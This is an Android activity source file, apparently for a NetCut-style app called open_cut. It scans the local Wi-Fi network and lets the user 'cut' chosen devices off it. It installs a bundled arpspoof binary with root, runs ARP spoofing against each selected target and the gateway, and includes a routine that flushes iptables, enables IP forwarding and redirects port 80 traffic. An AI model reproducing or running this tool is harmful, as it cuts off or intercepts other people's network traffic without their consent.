package com.serhat.open_cut;



import android.app.ListActivity;
import android.app.ProgressDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.graphics.Typeface;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.text.Html;
import android.text.format.Formatter;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.ImageView;
import android.widget.ListAdapter;
import android.widget.ListView;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.HashMap;


public class MainActivity extends ListActivity {

    private static boolean sArpspoofRunning = false;
    String gateWayIP = "";
    private EndpointReceiver mEndpointReceiver = null;
    private long mLastBackPressTime = 0;
    private NetworkDiscovery mNetworkDiscovery = null;

    public TargetAdapter mTargetAdapter = null;
    private Toast mToast = null;
    String myIP = "";
    private RelativeLayout rootLayout = null;
    public HashMap<String, Thread> runningSproof = null;

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView( R.layout.activity_main);
        rootLayout = (RelativeLayout) findViewById(R.id.layout);
        init();
    }
    public void createOnlineLayout() {
    }
    private void init() {
        WifiManager wifii = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        gateWayIP = Formatter.formatIpAddress(wifii.getDhcpInfo().gateway);
        myIP = Formatter.formatIpAddress(wifii.getConnectionInfo().getIpAddress());
        runningSproof = new HashMap<>();
        final ProgressDialog dialog = ProgressDialog.show(this, "", "Loading...", true, false);
        new Thread(new Runnable() {
            public void run() {
                dialog.show();
                extractArpspoof();
                installArpspoof();
                dialog.dismiss();
            }
        }).start();



        mTargetAdapter = new TargetAdapter();
        setListAdapter((ListAdapter) mTargetAdapter);
        getListView().setOnItemLongClickListener(new AdapterView.OnItemLongClickListener() {
            public boolean onItemLongClick(AdapterView<?> adapterView, View view, int position, long id) {
                final Target target = System.getTarget(position);
                new InputDialog.InputDialogListener() {
                    public void onInputEntered(String input) {
                        target.setAlias(input);
                        mTargetAdapter.notifyDataSetChanged();
                    }
                };
                return false;
            }
        });

        if (mEndpointReceiver == null) {
            mEndpointReceiver = new EndpointReceiver();
        }
        mEndpointReceiver.unregister();
        mEndpointReceiver.register(this);
        startNetworkDiscovery(false);
        invalidateOptionsMenu();
    }
    public void onListItemClick(ListView l, View v, int position, long id) {
        super.onListItemClick(l, v, position, id);
        sArpspoofRunning = true;
        System.setCurrentTarget(position);
        if (System.inInCutTargets(position)) {
            System.removeCutTarget(position);
            String ip = System.getTarget(position).getDisplayAddress();
            if (runningSproof.containsKey(ip)) {
                runningSproof.remove(ip);
            }
            Toast.makeText(this, "Uncut " + System.getTarget(position), Toast.LENGTH_SHORT).show();
        } else {
            System.addCutTarget(position);
            String ip2 = System.getTarget(position).getDisplayAddress();
            if (!this.runningSproof.containsKey(ip2)) {
                this.runningSproof.put(ip2, startArpspoof(ip2, this.gateWayIP));
            }
            Toast.makeText(this, "Cut " + System.getTarget(position), Toast.LENGTH_SHORT).show();
        }
        this.mTargetAdapter.notifyDataSetInvalidated();
    }

    public void onBackPressed() {
        if (mLastBackPressTime < java.lang.System.currentTimeMillis() - 4000) {
            mToast = Toast.makeText(this, "Please click BACK again to exit", Toast.LENGTH_SHORT);
            mToast.show();
            mLastBackPressTime = java.lang.System.currentTimeMillis();
            return;
        }
        if (mToast != null) {
            mToast.cancel();
        }
        stopAll();
        finish();
        mLastBackPressTime = 0;
    }



    public void extractArpspoof() {
        InputStream is = getResources().openRawResource(R.raw.arpspoof);
        //FileOutputStream out = null;
        byte[] buff = new byte[4096];
        try {
            FileOutputStream fileOutputStream = openFileOutput("arpspoof", 0);
            while (is.read(buff) > 0) {
                fileOutputStream.write(buff);
            }
            try {
                fileOutputStream.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public void installArpspoof() {
        try {
            Process process = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());
            os.writeBytes("mkdir /data/local/bin/\n");
            os.writeBytes("cp " + getFileStreamPath("arpspoof") + " " + getArpspoofPath() + "\n");
            os.writeBytes("chmod 770 " + getArpspoofPath() + "\n");
            os.writeBytes("exit\n");
            os.flush();
            process.waitFor();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e2) {
            e2.printStackTrace();
        }
    }
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        MenuInflater inflater = getMenuInflater();
        inflater.inflate(R.menu.menu, menu);
        return true;
    }
    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        int id = item.getItemId();
        if(id == R.id.refresh){
            System.reloadNetworkMapping();
            Toast.makeText(this, "Refreshing...", Toast.LENGTH_SHORT).show();
        }
        return super.onOptionsItemSelected(item);

    }


    private Thread startArpspoof(final String targetIP, final String gatewayIP) {
        final String exePath = getArpspoofPath();
        Thread t = new Thread() {
            public boolean running = true;

            public void run() {
                runSpoof();
            }

            private void runSpoof() {
                String command;
                try {
                    String wifi = MainActivity.this.getSharedPreferences("config", 0).getString("wifi", (String) null);
                    if (wifi == null || wifi.equals("")) {
                        wifi = "wlan0";
                    }
                    Process process = Runtime.getRuntime().exec("su");
                    DataOutputStream os = new DataOutputStream(process.getOutputStream());
                    if (!targetIP.equals("")) {
                        command = exePath + " -i " + wifi + " -t " + targetIP + " " + gatewayIP + "\n";
                    } else {
                        command = exePath + " -i " + wifi + " " + gatewayIP + "\n";
                    }
                    while (MainActivity.this.runningSproof.containsKey(targetIP)) {
                        if (isRunning(targetIP)) {
                            try {
                                Thread.sleep(5000);
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                        } else {
                            os.writeBytes(command);
                            os.flush();
                        }
                    }
                    process.destroy();
                } catch (IOException e2) {
                    e2.printStackTrace();
                }
            }

            private boolean isRunning(String ip) {
                boolean result = false;
                try {
                    BufferedReader mReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("ps").getInputStream()), 1024);
                    while (true) {
                        String line = mReader.readLine();
                        if (line == null) {
                            break;
                        } else if (line.length() != 0 && line.contains("arpspoof") && line.contains(ip)) {
                            result = true;
                        }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
                return result;
            }
        };
        t.start();
        return t;
    }
    private void startNat() {
        try {
            Process process = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());
            os.writeBytes("iptables -F;iptables -X;iptables -t nat -F;iptables -t nat -X;iptables -t mangle -F;iptables -t mangle -X;iptables -P INPUT ACCEPT;iptables -P FORWARD ACCEPT;iptables -P OUTPUT ACCEPT\n");
            os.flush();
            os.writeBytes("echo '1' > /proc/sys/net/ipv4/ip_forward\n");
            os.flush();
            os.writeBytes("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080\n");
            os.flush();
            os.writeBytes("exit\n");
            os.flush();
            process.waitFor();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e2) {
            e2.printStackTrace();
        }
    }

    private void stopAll() {
        try {
            Process process = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());
            os.writeBytes("killall -9 arpspoof\n");
            os.flush();
            os.writeBytes("exit\n");
            os.flush();
            process.waitFor();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e2) {
            e2.printStackTrace();
        }
        sArpspoofRunning = false;
    }


    private String getArpspoofPath() {
        return "/data/local/bin/arpspoof";
    }


    public void startNetworkDiscovery(boolean silent) {
        stopNetworkDiscovery(silent);
        this.mNetworkDiscovery = new NetworkDiscovery(this);
        this.mNetworkDiscovery.start();
        if (!silent) {
            Toast.makeText(this, "Scan Started", Toast.LENGTH_SHORT).show();
        }
    }
    public void stopNetworkDiscovery(boolean silent) {
        if (this.mNetworkDiscovery != null) {
            if (this.mNetworkDiscovery.isRunning()) {
                this.mNetworkDiscovery.exit();
                try {
                    this.mNetworkDiscovery.join();
                } catch (Exception e) {
                }
                if (!silent) {
                    Toast.makeText(this, "Scan stopped", Toast.LENGTH_SHORT).show();
                }
            }
            this.mNetworkDiscovery = null;
        }
    }
    private class EndpointReceiver extends ManagedReceiver {
        private IntentFilter mFilter;

        public EndpointReceiver() {
            super();
            this.mFilter = null;
            this.mFilter = new IntentFilter();
            this.mFilter.addAction(NetworkDiscovery.NEW_ENDPOINT);
            this.mFilter.addAction(NetworkDiscovery.ENDPOINT_UPDATE);
        }

        public IntentFilter getFilter() {
            return this.mFilter;
        }

        public void onReceive(Context context, Intent intent) {
            if (intent.getAction().equals(NetworkDiscovery.NEW_ENDPOINT)) {
                String hardware = (String) intent.getExtras().get(NetworkDiscovery.ENDPOINT_HARDWARE);
                String name = (String) intent.getExtras().get(NetworkDiscovery.ENDPOINT_NAME);
                final Target target = Target.getFromString((String) intent.getExtras().get(NetworkDiscovery.ENDPOINT_ADDRESS));
                if (target != null && target.getEndpoint() != null) {
                    if (name != null && !name.isEmpty()) {
                        target.setAlias(name);
                    }
                    target.getEndpoint().setHardware(Endpoint.parseMacAddress(hardware));
                    MainActivity.this.runOnUiThread(new Runnable() {
                        public void run() {
                            if (System.addOrderedTarget(target)) {
                                MainActivity.this.mTargetAdapter.notifyDataSetChanged();
                            }
                        }
                    });
                }
            } else if (intent.getAction().equals(NetworkDiscovery.ENDPOINT_UPDATE)) {
                MainActivity.this.runOnUiThread(new Runnable() {
                    public void run() {
                        MainActivity.this.mTargetAdapter.notifyDataSetChanged();
                    }
                });
            }
        }
    }
    public class TargetAdapter extends ArrayAdapter<Target> {

        class TargetHolder {
            TextView itemDescription;
            ImageView itemImage;
            TextView itemTitle;

            TargetHolder() {
            }
        }

        public TargetAdapter() {
            super(MainActivity.this, R.layout.target_list_item);
        }

        public int getCount() {
            return System.getTargets().size();
        }

        public View getView(int position, View convertView, ViewGroup parent) {
            TargetHolder holder;
            View row = convertView;
            if (row == null) {
                row = ((LayoutInflater) MainActivity.this.getSystemService(Context.LAYOUT_INFLATER_SERVICE)).inflate(R.layout.target_list_item, parent, false);
                holder = new TargetHolder();
                holder.itemImage = (ImageView) row.findViewById(R.id.itemIcon);
                holder.itemTitle = (TextView) row.findViewById(R.id.itemTitle);
                holder.itemDescription = (TextView) row.findViewById(R.id.itemDescription);
                row.setTag(holder);
            } else {
                holder = (TargetHolder) row.getTag();
            }
            Target target = System.getTarget(position);
            if (target.hasAlias()) {
                holder.itemTitle.setText(Html.fromHtml("<b>" + target.getAlias() + "</b> <small>( " + target.getDisplayAddress() + " )</small>"));
            } else {
                holder.itemTitle.setText(target.toString());
            }
            holder.itemTitle.setTypeface((Typeface) null, Typeface.NORMAL);
            holder.itemImage.setImageResource(target.getDrawableResourceId());
            holder.itemDescription.setText(target.getDescription());
            if (System.inInCutTargets(position)) {
                row.setBackgroundColor(Color.argb(20, 255, 0, 0));
            } else {
                row.setBackgroundColor(Color.argb(0, 255, 0, 0));
            }
            return row;
        }
    }
    public abstract class ManagedReceiver extends BroadcastReceiver {
        private boolean mRegistered = false;
        private Context mContext = null;

        @Override
        public void onReceive(Context context, Intent intent){
        }

        public void unregister(){
            if(mRegistered && mContext != null){
                mContext.unregisterReceiver(this);
                mRegistered = false;
                mContext = null;
            }
        }

        public void register(Context context){
            if(mRegistered)
                unregister();

            context.registerReceiver(this, getFilter());
            mRegistered = true;
            mContext = context;
        }


        public abstract IntentFilter getFilter();

        protected void finalize() throws Throwable{
            unregister();
            super.finalize();
        }
    }


}